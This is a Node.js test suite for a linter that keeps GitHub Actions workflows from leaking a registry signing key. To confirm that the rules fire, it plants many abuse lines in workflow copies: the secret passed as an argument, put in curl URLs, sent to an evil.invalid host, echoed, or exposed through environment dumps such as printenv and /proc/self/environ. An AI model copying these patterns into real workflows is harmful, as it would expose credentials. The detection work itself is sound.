'use strict';

// SEO-F4: no workflow lets a secret reach a command line, a URL, a log line, an artifact, a cache or a pull
// request run. Part 1 lints every real workflow. Part 2 plants each abuse in a copy of the registry workflow (and
// the exact old text) and needs the named rule red. Part 3 proves the trigger scope. Part 4 runs the login step's
// own run text with a key made at runtime, against a loopback fake registry, and reads the process list and the
// captured log while the key is in use. No real key, no network beyond 127.0.0.1.
const test = require('node:test');
const assert = require('node:assert/strict');
const crypto = require('node:crypto');
const fs = require('node:fs');
const http = require('node:http');
const os = require('node:os');
const path = require('node:path');
const { spawn, spawnSync } = require('node:child_process');
const { lintWorkflow, lintDir, readWorkflow } = require('../scripts/workflow-secret-lint.cjs');

const ROOT = path.join(__dirname, '..');
const WF_DIR = path.join(ROOT, '.github', 'workflows');
const REG = 'publish-mcp-registry.yml';
const REG_TEXT = fs.readFileSync(path.join(WF_DIR, REG), 'utf8');
// The line the registry workflow carried before SEO-F4 (master 2606372): the key as an argument.
const OLD_RUN = './mcp-publisher login dns --domain getmarrow.ai --private-key "$MCP_PRIVATE_KEY"';
const codes = (text) => [...new Set(lintWorkflow(text).map((v) => v.rule.split(' ')[0]))].sort();
const SHA40 = /@[0-9a-f]{40}\b/;
const PIN = (/uses: (actions\/checkout@[0-9a-f]{40})/.exec(REG_TEXT) || [])[1];

function swap(text, from, to) {
  const at = text.indexOf(from);
  assert.ok(at >= 0 && text.indexOf(from, at + 1) < 0, `plant anchor found exactly once: ${JSON.stringify(from.slice(0, 50))}`);
  return text.slice(0, at) + to + text.slice(at + from.length);
}
const RUN = '        run: |\n          set +x\n          node scripts/mcp-registry-dns-login.cjs --domain getmarrow.ai\n';
const ENVL = '          MCP_PRIVATE_KEY: ${{ secrets.MCP_PRIVATE_KEY }}\n';
const TRIG = "on:\n  workflow_dispatch:\n  push:\n    tags:\n      - 'mcp-registry-v*'\n";
const JOBIF = /    if: >-\n(?:      .*\n)+/;
const withRun = (...lines) => swap(REG_TEXT, RUN, `        run: |\n${lines.map((l) => `          ${l}\n`).join('')}`);
const withTrig = (t) => swap(REG_TEXT, TRIG, t);
const dropJobIf = () => { assert.match(REG_TEXT, JOBIF); return REG_TEXT.replace(JOBIF, ''); };
const withStep = (yaml) => swap(REG_TEXT, '      - name: Remove the registry token file\n', `${yaml}\n      - name: Remove the registry token file\n`);

// Part 1: the real workflows.
test('F4A real workflows: every file reads cleanly and has no finding', () => {
  const files = Object.keys(lintDir(WF_DIR));
  assert.ok(files.length >= 4 && files.includes(REG));
  for (const [f, list] of Object.entries(lintDir(WF_DIR))) assert.deepEqual(list, [], f);
});

test('F4A consumers: one secrets expression in the repo, MCP_PRIVATE_KEY, in the login step only', () => {
  const found = [];
  for (const f of fs.readdirSync(WF_DIR)) {
    const text = fs.readFileSync(path.join(WF_DIR, f), 'utf8');
    for (const m of text.matchAll(/\$\{\{([^}]*)\}\}/g)) if (/secrets/i.test(m[1])) found.push(`${f}:${m[1].trim()}`);
  }
  assert.deepEqual(found, [`${REG}:secrets.MCP_PRIVATE_KEY`]);
  const { entries } = readWorkflow(REG_TEXT);
  const binds = entries.filter((e) => e.path.includes('env') && /secrets/i.test(e.value));
  assert.equal(binds.length, 1);
  const stepName = entries.find((e) => e.key === 'name' && e.path[3] === binds[0].path[3]).value;
  assert.equal(stepName, 'Authenticate with getmarrow.ai DNS (ai.getmarrow/* namespace)');
  assert.deepEqual(binds[0].path.slice(4), ['env', 'MCP_PRIVATE_KEY']);
});

test('F4A step order: the master check comes before the key, the token file goes last and always', () => {
  const { entries } = readWorkflow(REG_TEXT);
  const names = entries.filter((e) => e.key === 'name' && e.path.length === 5 && e.path[2] === 'steps').map((e) => [Number(e.path[3].slice(1)), e.value]);
  const at = (n) => { const m = names.find(([, v]) => v === n); assert.ok(m, n); return m[0]; };
  const [guard, login, publish, verify, cleanup] = ['Require the commit to be on master', 'Authenticate with getmarrow.ai DNS (ai.getmarrow/* namespace)',
    'Publish registry metadata', 'Verify published registry version', 'Remove the registry token file'].map(at);
  assert.ok(guard < login && login < publish && publish < verify && verify < cleanup);
  assert.equal(cleanup, Math.max(...names.map(([i]) => i)), 'the cleanup step is the last step');
  const cond = entries.find((e) => e.key === 'if' && e.path.length === 5 && e.path[3] === `#${cleanup}`);
  assert.equal(cond && cond.value, 'always()');
});

test('F4B triggers and permissions: a tag push or a dispatch, read-only token, environment, timeout', () => {
  const { entries } = readWorkflow(REG_TEXT);
  const flat = entries.filter((e) => ['on', 'permissions'].includes(e.path[0]) || (e.path[0] === 'jobs' && e.path[2] === 'permissions'))
    .map((e) => `${e.path.join('.')}=${e.value}`);
  assert.deepEqual(flat, [
    'on=', 'on.workflow_dispatch=', 'on.push=', 'on.push.tags=', "on.push.tags.#1='mcp-registry-v*'",
    'permissions=', 'permissions.contents=read', 'jobs.publish.permissions=', 'jobs.publish.permissions.contents=read',
  ]);
  assert.doesNotMatch(REG_TEXT, /pull_request|workflow_run|issue_comment|schedule:|id-token|:\s*write/i);
  const job = (k) => entries.find((e) => e.path.join('.') === `jobs.publish.${k}`);
  assert.equal(job('environment').value, 'mcp-registry-publish');
  assert.equal(job('timeout-minutes').value, '10');
  assert.equal(job('runs-on').value, 'ubuntu-24.04');
});

test('F4C every uses line is a full 40-hex commit SHA and the pins equal the audited pins of the other workflows', () => {
  const uses = (text) => readWorkflow(text).entries.filter((e) => e.key === 'uses').map((e) => e.value);
  const mine = uses(REG_TEXT);
  assert.ok(mine.length >= 2);
  for (const u of mine) assert.match(u, /^[A-Za-z0-9_.-]+\/[A-Za-z0-9_./-]+@[0-9a-f]{40}( #.*)?$/);
  const others = new Set(['release-test.yml', 'pr-test.yml', 'npm-publish.yml'].flatMap((f) => uses(fs.readFileSync(path.join(WF_DIR, f), 'utf8'))));
  for (const u of mine) assert.ok(others.has(u), `same pin as another workflow: ${u}`);
});

// Part 2: plants. Each row: id, text, rule codes that must all be present.
const PLANTS = [
  ['old step form, single-line run (F4D)', () => swap(REG_TEXT, RUN, `        run: ${OLD_RUN}\n`), ['R2']],
  ['old step form with the old pin and no guard (F4D)', () => swap(swap(dropJobIf(), RUN, `        run: ${OLD_RUN}\n`), PIN, 'actions/checkout@v5'), ['R2', 'R4', 'R5']],
  ['P1 argv --private-key', () => withRun('./mcp-publisher login dns --domain getmarrow.ai --private-key "$MCP_PRIVATE_KEY"'), ['R2']],
  ['P1 argv braces', () => withRun('./mcp-publisher login dns --private-key "${MCP_PRIVATE_KEY}"'), ['R2']],
  ['P1 argv continuation', () => withRun('./mcp-publisher login dns \\', '  --private-key \\', '  "$MCP_PRIVATE_KEY"'), ['R2']],
  ['P1 interpolated into run', () => withRun('node scripts/mcp-registry-dns-login.cjs --key ${{ secrets.MCP_PRIVATE_KEY }}'), ['R1']],
  ['P1 interpolated, brackets', () => withRun('node x --key ${{ secrets[\'MCP_PRIVATE_KEY\'] }}'), ['R1']],
  ['P1 interpolated, upper case', () => withRun('node x --key ${{ SECRETS.MCP_PRIVATE_KEY }}'), ['R1']],
  ['P1 interpolated, toJSON', () => withRun('node x ${{ toJSON(secrets) }}'), ['R1']],
  ['P1 interpolated, format', () => withRun("node x ${{ format('{0}', secrets.MCP_PRIVATE_KEY) }}"), ['R1']],
  ['P1 interpolated, multi-line expression', () => withRun('node x ${{', '  secrets.MCP_PRIVATE_KEY }}'), ['R1']],
  ['P1 alias env.NAME', () => withRun('node x ${{ env.MCP_PRIVATE_KEY }}'), ['R1']],
  ['P1 alias toJSON(env)', () => withRun('node x ${{ toJSON(env) }}'), ['R1']],
  ['P2 URL with expression', () => withRun('curl https://user:${{ secrets.MCP_PRIVATE_KEY }}@example.invalid/x'), ['R1']],
  ['P2 URL with variable', () => withRun('curl "https://example.invalid/?k=$MCP_PRIVATE_KEY"'), ['R2']],
  ['P2 github.token in URL', () => withRun('curl https://example.invalid/${{ github.token }}'), ['R1']],
  ['P3 echo debug', () => withRun('echo "$MCP_PRIVATE_KEY"'), ['R2']],
  ['P3 printf', () => withRun("printf '%s\\n' \"$MCP_PRIVATE_KEY\""), ['R2']],
  ['P3 cat here-string', () => withRun('cat <<< "$MCP_PRIVATE_KEY"'), ['R2']],
  ['P3 bearer shape with the signing secret', () => withRun("curl --config <(printf 'header = \"Authorization: Bearer %s\"\\n' \"$MCP_PRIVATE_KEY\") https://api.github.com/user"), ['R2']],
  ['P3 add-mask echo', () => withRun('echo "::add-mask::$MCP_PRIVATE_KEY"'), ['R2']],
  ['P3 GITHUB_ENV write', () => withRun('echo "K=$MCP_PRIVATE_KEY" >> "$GITHUB_ENV"'), ['R2']],
  ['P4 key file in workspace', () => withRun("printf '%s' \"$MCP_PRIVATE_KEY\" > key.txt"), ['R2']],
  ['P4 artifact upload', () => withStep('      - name: Keep\n        uses: actions/upload-artifact@3d3c42e5aac5ba805825da76410c181273ba90b1\n        with:\n          path: .'), ['R5']],
  ['P5 cache step', () => withStep('      - name: Cache\n        uses: actions/cache@3d3c42e5aac5ba805825da76410c181273ba90b1\n        with:\n          path: .'), ['R5']],
  ['P5 setup-node cache input', () => swap(REG_TEXT, '          package-manager-cache: false\n', '          cache: npm\n'), ['R5']],
  ['P5 package-manager-cache on', () => swap(REG_TEXT, 'package-manager-cache: false', 'package-manager-cache: true'), ['R5']],
  ['P6 pull_request trigger', () => withTrig(`${TRIG}  pull_request:\n`), ['R5']],
  ['P6 pull_request_target', () => withTrig(`${TRIG}  pull_request_target:\n`), ['R5']],
  ['P6 workflow_run', () => withTrig(`${TRIG}  workflow_run:\n`), ['R5']],
  ['P6 issue_comment', () => withTrig(`${TRIG}  issue_comment:\n`), ['R5']],
  ['P6 schedule', () => withTrig(`${TRIG}  schedule:\n    - cron: '0 0 * * *'\n`), ['R5']],
  ['P6 inline on list', () => withTrig("on: [push, pull_request]\n"), ['R5']],
  ['P6 push with branches', () => withTrig('on:\n  workflow_dispatch:\n  push:\n    branches:\n      - master\n'), ['R5']],
  ['P6 dispatch with inputs', () => withTrig("on:\n  workflow_dispatch:\n    inputs:\n      ref:\n        type: string\n  push:\n    tags:\n      - 'mcp-registry-v*'\n"), ['R5']],
  ['P7 no job if', () => dropJobIf(), ['R5']],
  ['P7 if not master-only', () => REG_TEXT.replace(/refs\/heads\/master/, 'refs/heads/main'), ['R5']],
  ['P7 no environment', () => swap(REG_TEXT, '    environment: mcp-registry-publish\n', ''), ['R5']],
  ['P7 no timeout', () => swap(REG_TEXT, '    timeout-minutes: 10\n', ''), ['R5']],
  ['P7 no workflow permissions', () => swap(REG_TEXT, 'permissions:\n  contents: read\n\nconcurrency:', 'concurrency:'), ['R5']],
  ['P7 contents write', () => swap(REG_TEXT, '    permissions:\n      contents: read\n', '    permissions:\n      contents: write\n'), ['R5']],
  ['P7 id-token write', () => swap(REG_TEXT, '    permissions:\n      contents: read\n', '    permissions:\n      contents: read\n      id-token: write\n'), ['R5']],
  ['P7 write-all', () => swap(REG_TEXT, '    permissions:\n      contents: read\n', '    permissions: write-all\n'), ['R5']],
  ['P8 tag pin (checkout@v5)', () => REG_TEXT.replace(/actions\/checkout@[0-9a-f]{40}/, 'actions/checkout@v5'), ['R4']],
  ['P8 branch pin', () => REG_TEXT.replace(/actions\/checkout@[0-9a-f]{40}/, 'actions/checkout@main'), ['R4']],
  ['P8 short sha', () => REG_TEXT.replace(/actions\/checkout@[0-9a-f]{40}/, 'actions/checkout@3d3c42e'), ['R4']],
  ['P8 upper-case sha', () => REG_TEXT.replace(/actions\/checkout@[0-9a-f]{40}/, (m) => m.toUpperCase().replace('ACTIONS/CHECKOUT', 'actions/checkout')), ['R4']],
  ['P8 docker tag', () => withStep('      - name: Img\n        uses: docker://alpine:3'), ['R4']],
  ['P9 set -x', () => withRun('set -x', 'node scripts/mcp-registry-dns-login.cjs --domain getmarrow.ai'), ['R3']],
  ['P9 bash -x', () => withRun('bash -x scripts/mcp-registry-dns-login.cjs'), ['R3']],
  ['P9 xtrace option', () => withRun('set -o xtrace'), ['R3']],
  ['P9 shell flag', () => swap(REG_TEXT, ENVL + RUN, `${ENVL}        shell: bash -x {0}\n${RUN}`), ['R3']],
  ['P9 debug switch', () => swap(REG_TEXT, ENVL, `${ENVL}          ACTIONS_STEP_DEBUG: true\n`), ['R5']],
  ['P9 env dump', () => withRun('env | sort'), ['R3']],
  ['P9 printenv', () => withRun('printenv'), ['R3']],
  ['P9 declare -p', () => withRun('declare -p'), ['R3']],
  ['P9 export -p', () => withRun('export -p'), ['R3']],
  ['P9 proc environ', () => withRun('tr "\\0" "\\n" < /proc/self/environ'), ['R3']],
  ['P9 indirect', () => withRun('n=MCP_PRIV; echo "${!n}"'), ['R3']],
  ['P9 eval', () => withRun('eval "$X"'), ['R3']],
  ['P9 process.env dump', () => withRun("node -e 'console.log(JSON.stringify(process.env))'"), ['R3']],
  ['P9 awk ENVIRON', () => withRun("awk 'BEGIN { print ENVIRON[\"MCP_PRIV\" \"ATE_KEY\"] }'"), ['R3']],
  ['P9 inline node', () => withRun("node -e 'console.log(1)'"), ['R3']],
  ['P9 inline python', () => withRun("python3 -c 'print(1)'"), ['R3']],
  ['P9 inline perl', () => withRun("perl -e 'print 1'"), ['R3']],
  ['P9 ruby ENV', () => withRun("ruby -e 'p ENV.to_h'"), ['R3']],
  ['P9 expression in run text', () => withRun('echo ${{ github.event.head_commit.message }}'), ['R5']],
  ['P7 secrets passed on', () => swap(REG_TEXT, '    timeout-minutes: 10\n', '    timeout-minutes: 10\n    secrets: inherit\n'), ['R5']],
  ['P7 if with != master', () => REG_TEXT.replace(/github\.ref == 'refs\/heads\/master'/, "github.ref != 'refs/heads/master'"), ['R5']],
  ['P9 source', () => withRun('source ./x.sh'), ['R3']],
  ['P10 split value', () => withRun('echo "${MCP_PRIVATE_KEY:0:32} ${MCP_PRIVATE_KEY:32}"'), ['R2']],
  ['P10 encoded value', () => withRun("printf %s \"$MCP_PRIVATE_KEY\" | base64 | tr 'a-z' 'A-Z'"), ['R2']],
  ['P10 reversed value', () => withRun('rev <<< "$MCP_PRIVATE_KEY"'), ['R2']],
  ['P11 secret in a uses step', () => swap(REG_TEXT, RUN, `        uses: ${PIN}\n`), ['R2']],
  ['P12 job-level env', () => swap(REG_TEXT, '    timeout-minutes: 10\n', `    timeout-minutes: 10\n    env:\n${ENVL.slice(2)}`), ['R1']],
  ['P12 workflow-level env', () => swap(REG_TEXT, 'concurrency:', `env:\n  MCP_PRIVATE_KEY: \${{ secrets.MCP_PRIVATE_KEY }}\n\nconcurrency:`), ['R1']],
  ['P12 value with suffix', () => swap(REG_TEXT, ENVL, `${ENVL.trimEnd()}-x\n`), ['R1']],
  ['P12 two expressions on a line', () => swap(REG_TEXT, ENVL, `${ENVL.trimEnd()} \${{ secrets.OTHER }}\n`), ['R1']],
  ['P12 secret in a comment', () => swap(REG_TEXT, ENVL, `${ENVL}          # \${{ secrets.MCP_PRIVATE_KEY }}\n`), ['R1']],
  ['P12 secret in a with input', () => swap(REG_TEXT, '          fetch-depth: 0\n', '          fetch-depth: 0\n          token: ${{ secrets.MCP_PRIVATE_KEY }}\n'), ['R1']],
  ['P12 secret in a step name', () => swap(REG_TEXT, 'name: Validate registry metadata', 'name: ${{ secrets.MCP_PRIVATE_KEY }}'), ['R1']],
  ['P12 flow map env', () => swap(REG_TEXT, `        env:\n${ENVL}`, '        env: { MCP_PRIVATE_KEY: ${{ secrets.MCP_PRIVATE_KEY }} }\n'), ['R1']],
  ['P13 tab', () => swap(REG_TEXT, '    timeout-minutes: 10\n', '\ttimeout-minutes: 10\n'), ['R0']],
  ['P13 anchor', () => swap(REG_TEXT, ENVL, `${ENVL.trimEnd()}\n          OTHER: &a x\n`), ['R0']],
  ['P13 duplicate env key', () => swap(REG_TEXT, ENVL, `${ENVL}        env:\n          OTHER: x\n`), ['R0']],
  ['P13 compact sequence', () => swap(REG_TEXT, '    steps:\n      - name: Check out', '    steps:\n    - name: Check out'), ['R0']],
  ['P13 text under a scalar', () => swap(REG_TEXT, '    timeout-minutes: 10\n', '    timeout-minutes: 10\n      extra: 1\n'), ['R0']],
];

for (const [id, make, want] of PLANTS) {
  test(`F4D plant ${id} turns ${want.join('+')} red`, () => {
    const text = make();
    assert.notEqual(text, REG_TEXT);
    const got = codes(text);
    for (const w of want) assert.ok(got.includes(w), `${id}: want ${w}, got ${got.join(',') || 'none'}`);
  });
}

test('F4D controls: the sanctioned bearer shape, a local action and an unbound step stay clean', () => {
  const ok = withStep("      - name: Probe\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: |\n          curl -fsS --config <(printf 'header = \"Authorization: Bearer %s\"\\n' \"$GH_TOKEN\") https://api.github.com/user\n");
  assert.deepEqual(codes(ok), []);
  assert.deepEqual(codes(withStep('      - name: Local\n        uses: ./.github/actions/x')), []);
  const odd = withStep("      - name: Probe\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: |\n          curl -fsS --config <(printf '%s\\n' \"$GH_TOKEN\") https://api.github.com/user\n");
  assert.ok(codes(odd).includes('R2'), 'another printf shape is refused');
  const url = withStep("      - name: Probe\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: curl https://x/$GH_TOKEN\n");
  assert.ok(codes(url).includes('R2'));
  const probe = (curl) => withStep(`      - name: Probe\n        env:\n          GH_TOKEN: \${{ github.token }}\n        run: |\n          ${curl}\n`);
  const shape = "--config <(printf 'header = \"Authorization: Bearer %s\"\\n' \"$GH_TOKEN\")";
  assert.deepEqual(codes(probe(`curl -fsS ${shape} https://api.github.com/user`)), []);
  assert.ok(codes(probe(`curl -fsS ${shape} https://evil.invalid/x`)).includes('R2'), 'the bearer shape to another host is refused');
  assert.ok(codes(probe(`curl -fsS ${shape} https://api.github.com/user https://evil.invalid/x`)).includes('R2'), 'one bad URL on the line is enough');
  assert.ok(codes(probe(`curl -fsS ${shape}`)).includes('R2'), 'no URL: refused');
});

test('F4D the lint output names rule and line only, never the line text', () => {
  const text = withRun('echo "$MCP_PRIVATE_KEY"');
  const bad = lintWorkflow(text);
  assert.ok(bad.length >= 1);
  for (const v of bad) assert.match(`${v.line} ${v.rule}`, /^\d+ R\d [A-Za-z0-9 _,().*-]*$/);
});

// Part 3: which events can start the job.
function evalIf(expr, ctx) {
  assert.match(expr, /^(?:\s|github\.[a-z_]+|'[^']*'|&&|\|\||==|!=|!|\(|\)|,|startsWith)+$/, 'the job if uses only the forms this reader knows');
  const js = expr.replace(/github\.([a-z_]+)/g, (_, k) => `ctx.${k}`).replace(/!=|==/g, (m) => `${m}=`);
  // GitHub compares strings without case, so the reader does too.
  const fn = new Function('ctx', 'startsWith', `const c = Object.fromEntries(Object.entries(ctx).map(([k, v]) => [k, String(v).toLowerCase()])); ctx = c; return (${js.replace(/'([^']*)'/g, (m, s) => `'${s.toLowerCase()}'`)});`);
  return fn(ctx, (a, b) => String(a).toLowerCase().startsWith(String(b).toLowerCase()));
}
const jobIf = () => {
  const e = readWorkflow(REG_TEXT).entries.find((x) => x.path.join('.') === 'jobs.publish.if');
  assert.ok(e && e.block, 'the job has an if');
  return e.block.map((b) => b.text.trim()).join(' ');
};

test('F4B event matrix: only a tag push or a master dispatch starts the job', () => {
  const E = (event_name, ref, ref_type) => ({ event_name, ref, ref_type });
  const yes = [E('workflow_dispatch', 'refs/heads/master', 'branch'), E('push', 'refs/tags/mcp-registry-v3.9.116', 'tag'),
    E('workflow_dispatch', 'refs/heads/Master', 'branch')]; // GitHub compares without case: the master-ancestor step stops it
  const no = [E('pull_request', 'refs/pull/76/merge', 'branch'), E('pull_request_target', 'refs/heads/master', 'branch'),
    E('workflow_dispatch', 'refs/heads/pkg/other', 'branch'), E('workflow_dispatch', 'refs/tags/mcp-registry-v1', 'tag'),
    E('workflow_dispatch', 'refs/heads/master-evil', 'branch'), E('workflow_dispatch', 'refs/heads/master/x', 'branch'),
    E('push', 'refs/heads/master', 'branch'), E('push', 'refs/tags/npm-mcp-v3.9.116', 'tag'),
    E('push', 'refs/tags/v3.9.116', 'tag'), E('push', 'refs/heads/mcp-registry-v1', 'branch'),
    E('workflow_run', 'refs/heads/master', 'branch'), E('schedule', 'refs/heads/master', 'branch'),
    E('issue_comment', 'refs/heads/master', 'branch'), E('repository_dispatch', 'refs/heads/master', 'branch'), E('', '', '')];
  for (const c of yes) assert.equal(evalIf(jobIf(), c), true, JSON.stringify(c));
  for (const c of no) assert.equal(evalIf(jobIf(), c), false, JSON.stringify(c));
});

function stepRun(text, name) {
  const { entries } = readWorkflow(text);
  const at = entries.find((e) => e.key === 'name' && e.value === name);
  assert.ok(at, `step ${name}`);
  const run = entries.find((e) => e.key === 'run' && e.path[3] === at.path[3] && e.path[1] === at.path[1]);
  assert.ok(run, `run of ${name}`);
  return { text: run.block ? run.block.map((b) => b.text.slice(10)).join('\n').trimEnd() + '\n' : `${run.value}\n`, entries, step: at.path[3] };
}

function git(cwd, ...args) {
  const env = { PATH: process.env.PATH, HOME: cwd, GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@example.invalid', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@example.invalid' };
  const r = spawnSync('git', args, { cwd, env, encoding: 'utf8' });
  assert.equal(r.status, 0, `git ${args.join(' ')}: ${r.stderr}`);
  return r.stdout.trim();
}

test('F4B master-ancestor step: a commit on master passes, a commit only on another branch or tag fails', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'wf-anc-'));
  try {
    git(dir, 'init', '-q');
    git(dir, 'symbolic-ref', 'HEAD', 'refs/heads/master');
    git(dir, 'commit', '-q', '--allow-empty', '-m', 'a');
    const a = git(dir, 'rev-parse', 'HEAD');
    git(dir, 'commit', '-q', '--allow-empty', '-m', 'b');
    const b = git(dir, 'rev-parse', 'HEAD');
    git(dir, 'checkout', '-q', '-b', 'Master', a);
    git(dir, 'commit', '-q', '--allow-empty', '-m', 's');
    const s = git(dir, 'rev-parse', 'HEAD');
    git(dir, 'tag', 'mcp-registry-v9.9.9', s);
    git(dir, 'update-ref', 'refs/remotes/origin/master', b);
    const { text } = stepRun(REG_TEXT, 'Require the commit to be on master');
    const script = path.join(dir, 'step.sh');
    fs.writeFileSync(script, text);
    const run = (sha) => spawnSync('bash', ['--noprofile', '--norc', '-e', '-o', 'pipefail', script], { cwd: dir, env: { PATH: process.env.PATH, GITHUB_SHA: sha }, encoding: 'utf8' });
    assert.equal(run(b).status, 0);
    assert.equal(run(a).status, 0);
    const bad = run(s);
    assert.notEqual(bad.status, 0);
    assert.match(bad.stdout, /::error::The commit is not on master\./);
    assert.notEqual(run('0'.repeat(40)).status, 0, 'an unknown commit fails closed');
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

// Part 4: the login step's own run text, with a runtime key.
const LINUX = process.platform === 'linux';
const pair = crypto.generateKeyPairSync('ed25519');
const KEY = pair.privateKey.export({ format: 'der', type: 'pkcs8' }).subarray(-32).toString('hex');
const TOKEN = `dummy-registry-token-${crypto.randomBytes(24).toString('hex')}`;
for (const v of [KEY, TOKEN]) assert.doesNotMatch(v, /^(?:sk_|pk_|rk_|ghp_|xox)/);
assert.match(KEY, /^[0-9a-f]{64}$/);
const windows = (v) => Array.from({ length: Math.max(0, v.length - 15) }, (_, i) => v.slice(i, i + 16));
const leaks = (text, secrets = [KEY, TOKEN]) => secrets.flatMap((s) => windows(s.toLowerCase())).filter((w) => String(text).toLowerCase().includes(w)).length;

function procSnapshot() {
  const cmds = fs.readdirSync('/proc').filter((d) => /^\d+$/.test(d)).map((d) => {
    try { return fs.readFileSync(`/proc/${d}/cmdline`, 'utf8').split('\0').join(' '); } catch { return null; }
  }).filter((t) => t !== null);
  const ps = spawnSync('ps', ['-eo', 'args'], { encoding: 'utf8' });
  return { read: cmds.length, hits: cmds.reduce((n, t) => n + leaks(t), 0), psHits: ps.status === 0 ? leaks(ps.stdout) : null,
    helper: cmds.filter((t) => t.includes('scripts/mcp-registry-dns-login.cjs')).length };
}

function fakeRegistry(onRequest) {
  const s = http.createServer((req, res) => {
    let body = '';
    req.setEncoding('utf8').on('data', (c) => { body += c; }).on('end', () => onRequest(req, body, res));
  });
  return new Promise((resolve) => s.listen(0, '127.0.0.1', () => resolve(s)));
}

// The runner starts a run step as: bash --noprofile --norc -e -o pipefail <script file>.
function runStep(dir, runText, env, cwd) {
  const script = path.join(dir, 'step.sh');
  fs.writeFileSync(script, runText);
  return new Promise((resolve) => {
    const child = spawn('bash', ['--noprofile', '--norc', '-e', '-o', 'pipefail', script], { cwd, env, stdio: ['ignore', 'pipe', 'pipe'] });
    let log = '';
    child.stdout.on('data', (c) => { log += c; });
    child.stderr.on('data', (c) => { log += c; });
    child.on('close', (code) => resolve({ code, log }));
  });
}

test('F4A dry run: the login step text, with a runtime key, never shows the key in the process list or the log', { skip: !LINUX && 'needs /proc' }, async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'wf-dry-'));
  let srv;
  try {
    const login = stepRun(REG_TEXT, 'Authenticate with getmarrow.ai DNS (ai.getmarrow/* namespace)');
    const envs = login.entries.filter((e) => e.path[3] === login.step && e.path[4] === 'env' && e.path.length === 6);
    assert.deepEqual(envs.map((e) => [e.path[5], e.value]), [['MCP_PRIVATE_KEY', '${{ secrets.MCP_PRIVATE_KEY }}']]);
    const seen = [];
    srv = await fakeRegistry((req, body, res) => {
      seen.push({ method: req.method, url: req.url, body, snap: procSnapshot() });
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ registry_token: TOKEN }));
    });
    const shim = path.join(dir, 'loopback-shim.cjs');
    fs.writeFileSync(shim, [
      "const http = require('node:http'); const https = require('node:https');",
      'https.request = (url, opts, cb) => {',
      '  const u = new URL(String(url));',
      "  if (u.hostname !== 'registry.modelcontextprotocol.io') throw new Error('dry run: unexpected host');",
      '  return http.request(`http://127.0.0.1:${process.env.DRY_PORT}${u.pathname}`, opts, cb);',
      '};',
    ].join('\n'));
    const home = path.join(dir, 'home');
    fs.mkdirSync(home);
    // The runner puts the secret's value where the expression stood; the run text is used unchanged.
    const env = { PATH: process.env.PATH, HOME: home, MCP_PRIVATE_KEY: KEY, NODE_OPTIONS: `--require ${shim}`, DRY_PORT: String(srv.address().port) };
    const r = await runStep(dir, login.text, env, ROOT);
    assert.equal(r.code, 0, r.log);
    assert.equal(r.log, 'MCP_REGISTRY_LOGIN=OK method=dns domain=getmarrow.ai\n');
    assert.equal(leaks(r.log), 0, 'no window of the key or the token in the captured log');
    assert.equal(seen.length, 1);
    const [q] = seen;
    assert.deepEqual([q.method, q.url], ['POST', '/v0/auth/dns']);
    const sent = JSON.parse(q.body);
    assert.equal(crypto.verify(null, Buffer.from(sent.timestamp), pair.publicKey, Buffer.from(sent.signed_timestamp, 'hex')), true, 'the key reached the helper through the environment and signed');
    assert.equal(leaks(q.body), 0, 'the request carries a signature, never the key');
    assert.ok(q.snap.read > 3 && q.snap.helper >= 1, 'the snapshot saw the helper while it held the request');
    assert.equal(q.snap.hits, 0, 'no window of the key in any /proc cmdline while the helper was running');
    assert.ok(q.snap.psHits === 0 || q.snap.psHits === null, 'no window of the key in ps output');
    const file = path.join(home, '.config', 'mcp-publisher', 'token.json');
    assert.equal(fs.statSync(file).mode & 0o777, 0o600);
    assert.equal(JSON.parse(fs.readFileSync(file, 'utf8')).token, TOKEN);
    const rm = stepRun(REG_TEXT, 'Remove the registry token file');
    const gone = await runStep(dir, rm.text, { PATH: process.env.PATH, HOME: home }, dir);
    assert.equal(gone.code, 0);
    assert.equal(fs.existsSync(file), false, 'the last step deletes the token file');
  } finally {
    if (srv) { srv.closeAllConnections(); srv.close(); }
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('F4A dry run control: the old argv line is seen by the same process-list scan', { skip: !LINUX && 'needs /proc' }, async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'wf-ctl-'));
  try {
    fs.writeFileSync(path.join(dir, 'mcp-publisher'), '#!/bin/sh\nsleep 2\n', { mode: 0o755 });
    const done = runStep(dir, `${OLD_RUN}\n`, { PATH: process.env.PATH, HOME: dir, MCP_PRIVATE_KEY: KEY }, dir);
    let found = 0;
    for (const end = Date.now() + 5000; found === 0 && Date.now() < end;) {
      found = procSnapshot().hits;
      if (found === 0) await new Promise((r) => setTimeout(r, 25));
    }
    assert.ok(found > 0, 'the scan finds the key in the argv of the old step');
    assert.equal((await done).code, 0);
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});
